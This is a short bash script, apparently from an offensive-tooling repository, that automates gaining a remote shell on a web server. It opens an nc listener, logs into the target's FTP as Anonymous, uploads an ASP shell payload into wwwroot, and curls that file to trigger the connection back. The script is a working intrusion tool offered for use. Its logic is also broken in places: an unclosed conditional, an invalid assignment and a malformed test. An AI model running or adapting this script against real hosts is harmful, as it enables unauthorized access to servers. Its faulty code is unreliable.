#!/usr/bin/env bash

source meuk/globalmeuk.sh

localnic=${1:-}
HOST=${2:-}
LPORT=${3:-}


echo "[.] Incompentent bastard "


if [ -z "$localnic" ]; then
  echo "[!] TUN REMOTE (r_) of ETH?"
  exit;
fi

if beginswith r_ $localnic; then

  IP=$(echo "$localnic" | sed -e "s/^r_//")
  REMOTE = true
  echo 'remote '${IP}

  exit
if [ -z "$HOST" ]; then
  echo "URL?"
  exit;
fi

else
  #todo: move this to globalmeuk.sh
  IP=$(/sbin/ip -o -4 addr list $localnic | awk '{print $4}' | cut -d/ -f1);
fi

if [ $LPORT != '' && $ == $RE ]; then
  PORT=$LPORT
fi


cd http/payloads


USER='Anonymous'
PASSWD='Anonymous'
FILE='shell_'${PORT}'.asp'


echo '[!] Some times just wait a few secs before hitting CTR+C... to get this to work'
screen -dmS ftp_asp_${PORT} -O -L -Logfile ftp_asp_${PORT} nc -lnvp ${PORT}


ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
cd wwwroot
binary
put $FILE
quit
END_SCRIPT

cd ../../
sleep 5
echo "[!] type screen -r ftp_asp_${PORT} to get your shell" 

curl -v http://$2/shell_${PORT}.asp

